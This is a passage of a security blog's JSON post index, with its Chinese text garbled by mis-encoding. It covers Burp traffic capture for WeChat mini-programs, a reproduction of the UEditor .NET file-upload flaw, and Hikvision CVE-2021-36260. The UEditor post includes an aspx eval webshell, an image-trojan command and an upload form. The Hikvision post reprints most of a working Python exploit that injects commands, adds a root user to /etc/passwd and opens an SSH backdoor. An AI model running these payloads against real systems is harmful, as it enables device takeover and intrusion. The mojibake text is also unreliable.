ä½†æ˜¯å¯¹äºä¸€äº›HTTPSçš„ç«™ç‚¹ï¼Œæ‰‹æœºè®¿é—®ä¼šå¼¹å‡ºè­¦å‘Šâ€”â€”è¯ä¹¦ä¸å—ä¿¡ä»» ç‚¹å‡»ç¡®å®šç»§ç»­åï¼Œburpæ‰å¯ä»¥æŠ“åˆ°è¯¥æ•°æ®åŒ… ï¼ˆ2ï¼‰è¿›é˜¶ä¸Šé¢çš„æ–¹æ³•å¾ˆå¿«å°±èƒ½ç”¨æ‰‹æœºè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼šå¯¹HTTPSç«™ç‚¹çš„æ¸—é€å¾ˆç¹çç”šè‡³æ— æ•ˆï¼Œä»¥åŠå¯¹å¾®ä¿¡å…¬ä¼—å·(æŠ“ä¸å…¨)å’Œå°ç¨‹åºä¼šå‡ºç°æŠ“ä¸åˆ°åŒ…ã€æ— æ³•æŠ“å–appçš„æƒ…å†µã€‚åœ¨æ‰‹æœºå¯¼å…¥ä¸€ä¸ªburpè¯ä¹¦å³å¯ æ‰‹æœºè®¾ç½®å¥½ä»£ç†åï¼Œè®¿é—®http://burp ä¸‹è½½è¯ä¹¦ï¼Œä¸‹è½½çš„ä¸€èˆ¬é»˜è®¤æ˜¯deræ ¼å¼ï¼Œä¿®æ”¹æˆceræ ¼å¼ï¼Œç„¶åä»å­˜å‚¨è®¾å¤‡å®‰è£…å³å¯ï¼Œå‡­æ®ç”¨é€”å¯ä»¥â€œWLANâ€ã€â€œVPNå’Œåº”ç”¨â€éƒ½å®‰è£…ã€‚ å®‰è£…å¥½è¯ä¹¦åï¼Œå³å¯æŠ“å–å…¬ä¼—å·ã€å°ç¨‹åºã€appçš„åŒ… äºŒã€æŠ“ç”µè„‘ç«¯å¾®ä¿¡å…¬ä¼—å·ã€å°ç¨‹åºburpè®¾ç½®å¥½ä»£ç†ï¼Œå¯¼å‡ºè¯ä¹¦ æ‰“å¼€Edgeæµè§ˆå™¨â€”â€”è®¾ç½®â€”â€”éšç§ã€æœç´¢å’ŒæœåŠ¡â€”â€”ç®¡ç†è¯ä¹¦ï¼Œä¸‹è½½è¯ä¹¦å¹¶å¯¼å…¥ï¼Œæ³¨æ„ä¸€å®šæ˜¯é€‰æ‹©å—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„ å¯¼å…¥å¥½è¯ä¹¦åï¼Œè®¾ç½®å¥½ä»£ç† æŒ‰ç†æ¥è¯´ï¼Œè¿™æ ·å°±å¯ä»¥æŠ“åˆ°å…¬ä¼—å·å’Œå°ç¨‹åºçš„åŒ…äº†ï¼Œä½†å®é™…æƒ…å†µæ˜¯å®Œå…¨æŠ“ä¸åˆ°å°ç¨‹åºçš„åŒ…ã€‚ æˆ‘ä»¬å¯ä»¥é€€å‡ºå¾®ä¿¡PCç«¯ï¼Œå°†ç›®å½•C:\\Users\\ç”¨æˆ·å\\AppData\\Roaming\\Tencent\\WeChat\\XPlugin\\Plugins\\WMPFRuntimeç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åˆ é™¤ é‡æ–°ç™»å½•å¾®ä¿¡ï¼Œå†æ¬¡å°è¯•æŠ“å°ç¨‹åºçš„åŒ…ï¼Œå°±å¯ä»¥æŠ“åˆ°åŒ…äº†ã€‚ å¯èƒ½æœ‰çš„å¸ˆå‚…æ²¡æœ‰è¿™ä¸ªç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æ‰“å¼€ä¸€ä¸ªå¾®ä¿¡å°ç¨‹åºï¼Œæ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œå®šä½åˆ°å°ç¨‹åºçš„è¿›ç¨‹ï¼Œæ‰“å¼€æ–‡ä»¶æ‰€åœ¨ä½ç½® å›é€€åˆ°Pluginsç›®å½•ä¸‹ï¼Œè¿›å…¥WMPFRuntimeæ–‡ä»¶å¤¹ï¼Œé€€å‡ºå¾®ä¿¡ï¼Œåˆ é™¤è¯¥æ–‡ä»¶å¤¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œé‡æ–°ç™»å½•å¾®ä¿¡PCç«¯å³å¯æŠ“åˆ°å°ç¨‹åºçš„åŒ…ã€‚ è¿™æ ·ä¸æ˜¯é•¿ä¹…ä¹‹è®¡ï¼Œä½†ç›®å‰èƒ½åšçš„åªæœ‰æŠ“ä¸åˆ°å°±åˆ é™¤ä¸€æ¬¡ï¼ŒæŠ“ä¸åˆ°åˆ é™¤ä¸€æ¬¡ï¼Œé—®æˆ‘ä¸ºä»€ä¹ˆè¿™æ ·å°±å¯ä»¥äº†ï¼Œæˆ‘ä¹Ÿä¸æ‡‚hhhã€‚æœ‰å¸ˆå‚…æœ‰æ›´å¥½çš„è§£å†³æ–¹æ¡ˆï¼Œæ¬¢è¿è¯„è®ºåŒºæå‡º~","categories":[{"name":"å®‰å…¨å·¥å…·/å®‰å…¨å¼€å‘","slug":"å®‰å…¨å·¥å…·-å®‰å…¨å¼€å‘","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"BurpSuite","slug":"BurpSuite","permalink":"https://wolke.cn/tags/BurpSuite/"},{"name":"å¾®ä¿¡å°ç¨‹åº","slug":"å¾®ä¿¡å°ç¨‹åº","permalink":"https://wolke.cn/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"author":"w01ke"},{"title":"Ueditorç¼–è¾‘å™¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","slug":"Ueditorç¼–è¾‘å™¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","date":"2022-07-30T11:58:18.000Z","updated":"2022-07-30T12:50:26.545Z","comments":true,"path":"post/bd0a7a34.html","link":"","permalink":"https://wolke.cn/post/bd0a7a34.html","excerpt":"","text":"ä¸€ã€æ¼æ´æè¿°UEditoræ˜¯ä¸€æ¬¾æ‰€è§å³æ‰€å¾—çš„å¼€æºå¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå…·æœ‰è½»é‡ã€å¯å®šåˆ¶ã€ç”¨æˆ·ä½“éªŒä¼˜ç§€ç­‰ç‰¹ç‚¹ï¼Œè¢«å¹¿å¤§WEBåº”ç”¨ç¨‹åºæ‰€ä½¿ç”¨ã€‚æœ¬æ¬¡çˆ†å‡ºçš„é«˜å±æ¼æ´å±äº.NETç‰ˆæœ¬ï¼Œå…¶å®ƒçš„ç‰ˆæœ¬æš‚æ—¶ä¸å—å½±å“ã€‚æ¼æ´æˆå› æ˜¯åœ¨æŠ“å–è¿œç¨‹æ•°æ®æºçš„æ—¶å€™æœªå¯¹æ–‡ä»¶åç¼€ååšéªŒè¯å¯¼è‡´ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ï¼Œé»‘å®¢åˆ©ç”¨æ­¤æ¼æ´å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„æŒ‡ä»¤ï¼Œç»¼åˆè¯„çº§é«˜å±ã€‚ äºŒã€å½±å“èŒƒå›´è¯¥æ¼æ´å½±å“UEditorçš„.Netç‰ˆæœ¬ï¼Œå…¶å®ƒè¯­è¨€ç‰ˆæœ¬æš‚æ—¶æœªå—å½±å“ã€‚ ä¸‰ã€æ¼æ´åŸç†æ¼æ´çš„æˆå› æ˜¯åœ¨è·å–å›¾ç‰‡èµ„æºæ—¶ä»…æ£€æŸ¥äº†Content-Typeï¼Œå¯¼è‡´å¯ä»¥ç»•è¿‡è¾¾åˆ°ä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚å…·ä½“çš„æ¼æ´åˆ†æå¯å‚è€ƒï¼šhttps://www.freebuf.com/vuls/181814.html å››ã€æ¼æ´å¤ç°1ã€ç¯å¢ƒéƒ¨ç½²å‡†å¤‡ä¸€å°Windows ServeræœåŠ¡å™¨ï¼Œæˆ‘ç”¨çš„æ˜¯Windows 2008 Serverã€‚ æ²¡æœ‰å®‰è£….NET Framework 4.0çš„è¦å…ˆå®‰è£…ï¼šhttp://www.microsoft.com/zh-cn/download/details.aspx?id=17718 å®‰è£…å®Œ .NET Framework 4.0 åï¼Œè¿˜éœ€è¦å‘ IIS æ³¨å†Œåº”ç”¨ç¨‹åºæ± ï¼Œæ³¨å†Œçš„æ–¹æ³•æ˜¯ï¼Œä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼ˆCMDï¼‰ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_regiis -i å®‰è£…å®Œæ¯•åï¼Œåœ¨ IIS ç®¡ç†å™¨åˆ·æ–°å°±èƒ½çœ‹åˆ° 4.0 çš„åº”ç”¨ç¨‹åºæ± ã€‚ https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3 ä¸‹è½½utf8çš„.netç‰ˆæœ¬ å³é”® ç½‘ç«™â€“æ·»åŠ ç½‘ç«™ï¼Œé€‰æ‹©ä¸‹è½½çš„Ueditorç›®å½•ï¼Œ é€‰æ‹©ç‰ˆæœ¬ä¸º 4.0 çš„åº”ç”¨ç¨‹åºæ± ï¼›ç‚¹å‡»è¿æ¥ä¸ºï¼Œè®¾ç½®ç‰¹å®šç”¨æˆ·ï¼Œè¯¥ç‰¹å®šç”¨æˆ·ä¸ºä¸»æœºä¸Šå­˜åœ¨çš„ç”¨æˆ·ä¾‹å¦‚administrator æ­¤æ—¶è®¿é—®127.0.0.1:8080å·²ç»æœ‰Ueditorçš„ç•Œé¢äº† ä»£ç è¦æ±‚ä»¥åº”ç”¨ç¨‹åºçš„å½¢å¼æ¥è¿è¡Œï¼ˆå¯ä»¥æ–¹ä¾¿åŠ å…¥åº“ä¾èµ–å’Œç»„ç»‡ä»£ç ï¼‰ã€‚æ‰€ä»¥éœ€è¦æŠŠ net ç›®å½•è½¬æ¢ä¸ºåº”ç”¨ç¨‹åºï¼›ç‚¹å‡»è¿æ¥ä¸ºï¼Œè®¾ç½®ç‰¹å®šç”¨æˆ·ï¼Œè¯¥ç‰¹å®šç”¨æˆ·ä¸ºä¸»æœºä¸Šå­˜åœ¨çš„ç”¨æˆ·ä¾‹å¦‚administrator è®¿é—®net/controller.ashx æ§åˆ¶å™¨æ–‡ä»¶ï¼Œå‡ºç°ä»¥ä¸‹ç•Œé¢è¯´æ˜ç¼–è¾‘å™¨åº”ç”¨ç¨‹åºè¿è¡ŒæˆåŠŸï¼Œä¸”æ¼æ´å­˜åœ¨ï¼Œåˆ°æ­¤é…ç½®å®Œæ¯•ã€‚ å¦‚æœé…ç½®è¿‡ç¨‹ä¸­è®¿é—®é¡µé¢æ˜¾ç¤ºæƒé™ä¸å¤Ÿçš„æŠ¥é”™ï¼Œé‚£ä¹ˆå³é”®éƒ¨ç½²é¡¹ç›®çš„æ–‡ä»¶å¤¹ï¼Œé€‰æ‹©å±æ€§ï¼Œé€‰æ‹©å®‰å…¨ï¼Œå¢åŠ Everyoneç”¨æˆ·ï¼Œå°†è¯¥ç”¨æˆ·çš„æƒé™è®¾ç½®ä¸ºå®Œå…¨æ§åˆ¶ï¼Œç‚¹å‡»ç¡®å®šï¼Œé‡æ–°éƒ¨ç½²å³å¯ã€‚ 2ã€æ”»å‡»æµç¨‹è®¿é—®http://ip:port/net/controller.ashx æ§åˆ¶å™¨æ–‡ä»¶ã€‚å½“å‡ºç°ä¸‹å›¾çš„æ—¶å€™è¡¨ç¤ºæ¼æ´å­˜åœ¨ å‡†å¤‡ä¸€ä¸ªaspxä¸€å¥è¯æœ¨é©¬ &lt;% @Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;w01ke&quot;],&quot;unsafe&quot;);%&gt; åˆ¶ä½œå›¾ç‰‡é©¬ copy w01ke.jpg /b + shell.aspx /a ueditor.jpg å‡†å¤‡ä¸€å°æœåŠ¡å™¨å­˜æ”¾å›¾ç‰‡é©¬æˆ–è€…éœ€è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå°†åšå¥½çš„ueditor.jpgå›¾ç‰‡é©¬ä¸Šä¼ åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œå¹¶å¼€å¯ä¸‹è½½æœåŠ¡ï¼ˆHTTPï¼‰ python -m SimpleHTTPServer 8080 åˆ¶ä½œä¸€ä¸ªHTMLã€‚å› ä¸ºä¸æ˜¯ä¸Šä¼ æ¼æ´æ‰€ä»¥enctype ä¸éœ€è¦æŒ‡å®šä¸ºmultipart/form-dataã€‚ &lt;form action=&quot;http://xxxxx/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot;&gt; &lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt; å…¶ä¸­http://xx.com ä¸ºéœ€è¦æµ‹è¯•çš„ç½‘ç«™åœ°å€ï¼Œactionåå¡«å†™è·¯å¾„ä¸ºå®é™…ä¸­é‡åˆ°çš„è·¯å¾„ï¼Œä¸è¦å¤ªæ­»æ¿ï¼Œå¦‚æœå¤ªæ­»æ¿ä¸æŒ‰ç½‘ç«™çš„å®é™…è·¯å¾„æ¥å°±ä¼šå‡ºç°è·¯å¾„æ‰¾ä¸åˆ°çš„é”™è¯¯ æ‰“å¼€æˆ‘ä»¬åšå¥½çš„HTMLï¼Œshell addr å¤„å¡«å†™æœåŠ¡å™¨ä¸Šå›¾ç‰‡é©¬åœ°å€ï¼Œæ„é€ æˆä»¥ä¸‹æ ¼å¼ï¼Œç»•è¿‡ä¸Šä¼ ä½¿å…¶è§£æä¸º aspx http://xxxx/ueditor.jpg?.aspx ç‚¹å‡»submitï¼Œç›´æ¥æ˜¾ç¤ºæ— æ•ˆURL ç»è¿‡æ’æŸ¥ï¼Œå‘ç°ä¸èƒ½ç”¨Pythonå¼€å¯webçš„æ–¹å¼ï¼Œè²Œä¼¼åªèƒ½ç”¨åŸŸåçš„å½¢å¼ï¼ˆæˆ‘ä¸ç¡®å®šï¼‰ï¼Œæˆ‘åªå¥½æŠŠæˆ‘çš„å›¾ç‰‡é©¬ä¸Šä¼ è‡³äº‘æœåŠ¡å™¨ï¼Œç„¶åä¿®æ”¹è®¿é—®åŸŸåå³å¯æˆåŠŸï¼ŒåŒæ—¶å›æ˜¾äº†æœ¨é©¬è·¯å¾„ ä½¿ç”¨èšå‰‘è¿æ¥ï¼š äº”ã€é˜²å¾¡æªæ–½ ä¿®æ”¹CrawlerHandler.cs å¢åŠ å¯¹æ–‡ä»¶æ‰©å±•åçš„ï¼› IPSç­‰é˜²å¾¡äº§å“å¯ä»¥åŠ å…¥ç›¸åº”çš„ç‰¹å¾","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Ueditor","slug":"Ueditor","permalink":"https://wolke.cn/tags/Ueditor/"},{"name":".NET","slug":"NET","permalink":"https://wolke.cn/tags/NET/"}],"author":"w01ke"},{"title":"æµ·åº·å¨è§†è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-36260ï¼‰","slug":"æµ·åº·å¨è§†è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-36260ï¼‰","date":"2022-07-29T07:54:06.000Z","updated":"2022-07-29T11:37:31.042Z","comments":true,"path":"post/8d6522ff.html","link":"","permalink":"https://wolke.cn/post/8d6522ff.html","excerpt":"","text":"ä¸€ã€å‰è¨€ä½œä¸ºHW2022çš„é˜²å®ˆæ–¹ï¼Œå‘ç°ä¸€IPé¢‘ç¹å¯¹æˆ‘æ–¹èµ„äº§è¿›è¡Œæ‰«æï¼Œé‚è¿›è¡Œæº¯æº äºŒã€æ¼æ´æ¦‚è¿°æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯ä»¥ç”¨æ— é™åˆ¶çš„ root shell æ¥å®Œå…¨æ§åˆ¶è®¾å¤‡ï¼Œå³ä½¿è®¾å¤‡çš„æ‰€æœ‰è€…å—é™äºæœ‰é™çš„å—ä¿æŠ¤ shellï¼ˆpshï¼‰ã€‚é™¤äº†å…¥ä¾µ IP æ‘„åƒå¤´å¤–ï¼Œè¿˜å¯ä»¥è®¿é—®å’Œæ”»å‡»å†…éƒ¨ç½‘ç»œã€‚ è¯¥æ¼æ´çš„åˆ©ç”¨å¹¶ä¸éœ€è¦ç”¨æˆ·äº¤äº’ï¼Œæ”»å‡»è€…åªéœ€è¦è®¿é—® http æˆ– HTTPS æœåŠ¡å™¨ç«¯å£ï¼ˆ80/443ï¼‰å³å¯åˆ©ç”¨è¯¥æ¼æ´ï¼Œæ— éœ€ç”¨æˆ·åã€å¯†ç ã€ä»¥åŠå…¶ä»–æ“ä½œã€‚æ‘„åƒå¤´æœ¬èº«ä¹Ÿä¸ä¼šæ£€æµ‹åˆ°ä»»ä½•ç™»å½•ä¿¡æ¯ã€‚ ä¸‰ã€æº¯æºè¿‡ç¨‹å®šä½æ”»å‡»IPä¸æœç´¢å¨èƒæƒ…æŠ¥ï¼Œå‘ç°æ˜¯æ¶æ„IP Fofaç©ºé—´æœç´¢å¼•æ“å‘ç°è¯¥IPå¼€æ”¾äº†82ç«¯å£ è®¿é—®å‘ç°æ˜¯HIKVISIONçš„ç™»å½•ç•Œé¢ æ¼æ´ç‚¹ä½äºï¼š/SDK/webLanguageï¼Œåˆ©ç”¨PUTæ–¹æ³•ä¸Šä¼ xmlæ•°æ®ï¼š &lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&lt;language&gt;$(Command &gt; webLib/x)&lt;/language&gt; å†å»è¯·æ±‚è·¯å¾„ï¼š/xï¼Œå‘ç°å‘½ä»¤å·²ç»æ‰§è¡ŒæˆåŠŸ ä½¿ç”¨EXPæˆåŠŸæ‹¿ä¸‹è¯¥æ‘„åƒå¤´çš„å®Œå…¨æ§åˆ¶æƒï¼Œæ’æŸ¥åæ­¤åº”ä¸ºæ”»å‡»è€…çš„è·³æ¿æœº æ­¤ç½‘æ®µå­˜åœ¨è®¸å¤šæ„ŸæŸ“æ‘„åƒå¤´ï¼Œä¹Ÿéƒ½å­˜åœ¨ä¸Šè¿°æ¼æ´ è™½ç„¶æ‹¿ä¸‹äº†å®Œå…¨æ§åˆ¶æƒï¼Œä½†æ˜¯ä¸çŸ¥é“å¦‚ä½•æŸ¥çœ‹æ‘„åƒå¤´Webé¡µé¢çš„ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œæœ‰å¤§ä½¬çŸ¥é“çš„å¯ä»¥è¯„è®ºåŒºæ•™æ•™æˆ‘ï¼ˆä¸‡åˆ†æ„Ÿè°¢ï¼ï¼‰ å››ã€POC# Exploit Title: Hikvision Web Server Build 210702 - Command Injection# Exploit Author: bashis# Vendor Homepage: https://www.hikvision.com/# Version: 1.0# CVE: CVE-2021-36260# Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html# All credit to Watchful_IP#!/usr/bin/env python3&quot;&quot;&quot;Note:1) This code will _not_ verify if remote is Hikvision device or not.2) Most of my interest in this code has been concentrated on how to reliably detect vulnerable and/or exploitable devices. Some devices are easy to detect, verify and exploit the vulnerability, other devices may be vulnerable but not so easy to verify and exploit. I think the combined verification code should have very high accuracy.3) &#x27;safe check&#x27; (--check) will try write and read for verification &#x27;unsafe check&#x27; (--reboot) will try reboot the device for verification[Examples]Safe vulnerability/verify check: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --checkSafe and unsafe vulnerability/verify check:(will only use &#x27;unsafe check&#x27; if not verified with &#x27;safe check&#x27;) $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --rebootUnsafe vulnerability/verify check: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --rebootLaunch and connect to SSH shell: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shellExecute command: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd &quot;ls -l&quot;Execute blind command: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind &quot;reboot&quot;$./CVE-2021-36260.py -h[*] Hikvision CVE-2021-36260[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check] [--reboot] [--shell] [--cmd CMD] [--cmd_blind CMD_BLIND] [--noverify] [--proto &#123;http,https&#125;]optional arguments: -h, --help show this help message and exit --rhost RHOST Remote Target Address (IP/FQDN) --rport RPORT Remote Target Port --check Check if vulnerable --reboot Reboot if vulnerable --shell Launch SSH shell --cmd CMD execute cmd (i.e: &quot;ls -l&quot;) --cmd_blind CMD_BLIND execute blind cmd (i.e: &quot;reboot&quot;) --noverify Do not verify if vulnerable --proto &#123;http,https&#125; Protocol used$&quot;&quot;&quot;import osimport argparseimport timeimport requestsfrom requests import packagesfrom requests.packages import urllib3from requests.packages.urllib3 import exceptionsclass Http(object): def __init__(self, rhost, rport, proto, timeout=60): super(Http, self).__init__() self.rhost = rhost self.rport = rport self.proto = proto self.timeout = timeout self.remote = None self.uri = None &quot;&quot;&quot; Most devices will use self-signed certificates, suppress any warnings &quot;&quot;&quot; requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) self.remote = requests.Session() self._init_uri() self.remote.headers.update(&#123; &#x27;Host&#x27;: f&#x27;&#123;self.rhost&#125;:&#123;self.rport&#125;&#x27;, &#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;, &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.9,sv;q=0.8&#x27;, &#125;) &quot;&quot;&quot; self.remote.proxies.update(&#123; # &#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;, &#125;) &quot;&quot;&quot; def send(self, url=None, query_args=None, timeout=5): if query_args: &quot;&quot;&quot;Some devices can handle more, others less, 22 bytes seems like a good compromise&quot;&quot;&quot; if len(query_args) &gt; 22: print(f&#x27;[!] Error: Command &quot;&#123;query_args&#125;&quot; to long (&#123;len(query_args)&#125;)&#x27;) return None &quot;&quot;&quot;This weird code will try automatically switch between http/https and update Host &quot;&quot;&quot; try: if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) except requests.exceptions.ConnectionError: self.proto = &#x27;https&#x27; if self.proto == &#x27;http&#x27; else &#x27;https&#x27; self._init_uri() try: if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) except requests.exceptions.ConnectionError: return None except requests.exceptions.RequestException: return None except KeyboardInterrupt: return None &quot;&quot;&quot;302 when requesting http on https enabled device&quot;&quot;&quot; if data.status_code == 302: redirect = data.headers.get(&#x27;Location&#x27;) self.uri = redirect[:redirect.rfind(&#x27;/&#x27;)] self._update_host() if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) return data def _update_host(self): if not self.remote.headers.get(&#x27;Host&#x27;) == self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:]: self.remote.headers.update(&#123; &#x27;Host&#x27;: self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:], &#125;) def _init_uri(self): self.uri = &#x27;&#123;proto&#125;://&#123;rhost&#125;:&#123;rport&#125;&#x27;.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport)) def put(self, url, query_args, timeout): &quot;&quot;&quot;Command injection in the &lt;language&gt; tag&quot;&quot;&quot; query_args = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27; \\ f&#x27;&lt;language&gt;$(&#123;query_args&#125;)&lt;/language&gt;&#x27; return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout) def get(self, url, timeout): return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)def check(remote, args): &quot;&quot;&quot; status_code == 200 (OK); Verified vulnerable and exploitable status_code == 500 (Internal Server Error); Device may be vulnerable, but most likely not The SDK webLanguage tag is there, but generate status_code 500 when language not found I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500) (Issue: Could also be other directory than &#x27;webLib&#x27;, r/o FS etc...) status_code == 401 (Unauthorized); Defiantly not vulnerable &quot;&quot;&quot; if args.noverify: print(f&#x27;[*] Not verifying remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) return True print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) data = remote.send(url=&#x27;/&#x27;, query_args=None) if data is None: print(f&#x27;[-] Cannot establish connection to &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) return None print(&#x27;[i] ETag:&#x27;, data.headers.get(&#x27;ETag&#x27;)) data = remote.send(query_args=&#x27;&gt;webLib/c&#x27;) if data is None or data.status_code == 404: print(f&#x27;[-] &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; do not looks like Hikvision&#x27;) return False status_code = data.status_code data = remote.send(url=&#x27;/c&#x27;, query_args=None) if not data.status_code == 200: &quot;&quot;&quot;We could not verify command injection&quot;&quot;&quot; if status_code == 500: print(f&#x27;[-] Could not verify if vulnerable (Code: &#123;status_code&#125;)&#x27;) if args.reboot: return check_reboot(remote, args) else: print(f&#x27;[+] Remote is not vulnerable (Code: &#123;status_code&#125;)&#x27;) return False print(&#x27;[!] Remote is verified exploitable&#x27;) return Truedef check_reboot(remote, args): &quot;&quot;&quot; We sending &#x27;reboot&#x27;, wait 2 sec, then checking with GET request. - if there is data returned, we can assume remote is not vulnerable. - If there is no connection or data returned, we can assume remote is vulnerable. &quot;&quot;&quot; if args.check: print(&#x27;[i] Checking if vulnerable with &quot;reboot&quot;&#x27;) else: print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; with &quot;reboot&quot;&#x27;) remote.send(query_args=&#x27;reboot&#x27;) time.sleep(2) if not remote.send(url=&#x27;/&#x27;, query_args=None): print(&#x27;[!] Remote is vulnerable&#x27;) return True else: print(&#x27;[+] Remote is not vulnerable&#x27;) return Falsedef cmd(remote, args): if not check(remote, args): return False data = remote.send(query_args=f&#x27;&#123;args.cmd&#125;&gt;webLib/x&#x27;) if data is None: return False data = remote.send(url=&#x27;/x&#x27;, query_args=None) if data is None or not data.status_code == 200: print(f&#x27;[!] Error execute cmd &quot;&#123;args.cmd&#125;&quot;&#x27;) return False print(data.text) return Truedef cmd_blind(remote, args): &quot;&quot;&quot; Blind command injection &quot;&quot;&quot; if not check(remote, args): return False data = remote.send(query_args=f&#x27;&#123;args.cmd_blind&#125;&#x27;) if data is None or not data.status_code == 500: print(f&#x27;[-] Error execute cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;) return False print(f&#x27;[i] Try execute blind cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;) return Truedef shell(remote, args): if not check(remote, args): return False data = remote.send(url=&#x27;/N&#x27;, query_args=None) if data.status_code == 404: print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; not pwned, pwning now!&#x27;) data = remote.send(query_args=&#x27;echo -n P::0:0:W&gt;N&#x27;) if data.status_code == 401: print(data.headers) print(data.text) return False remote.send(query_args=&#x27;echo :/:/bin/sh&gt;&gt;N&#x27;) remote.send(query_args=&#x27;cat N&gt;&gt;/etc/passwd&#x27;) remote.send(query_args=&#x27;dropbear -R -B -p 1337&#x27;) remote.send(query_args=&#x27;cat N&gt;webLib/N&#x27;) else: print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; already pwned&#x27;) print(f&#x27;[*] Trying SSH to &#123;args.rhost&#125; on port 1337&#x27;) os.system(f&#x27;stty echo; stty iexten; stty icanon; \\ ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \\ P@&#123;args.rhost&#125; -p 1337&#x27;)def main(): print(&#x27;[*] Hikvision CVE-2021-36260\\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#x27;) parser = argparse.ArgumentParser() parser.add_argument(&#x27;--rhost&#x27;, required=True, type=str, default=None, help=&#x27;Remote Target Address (IP/FQDN)&#x27;) parser.add_argument(&#x27;--rport&#x27;, required=False, type=int, default=80, help=&#x27;Remote Target Port&#x27;) parser.add_argument(&#x27;--check&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Check if vulnerable&#x27;) parser.add_argument(&#x27;--reboot&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Reboot if vulnerable&#x27;) parser.add_argument(&#x27;--shell&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Launch SSH shell&#x27;) parser.add_argument(&#x27;--cmd&#x27;, required=False, type=str, default=None, help=&#x27;execute cmd (i.e: &quot;ls -l&quot;)&#x27;) 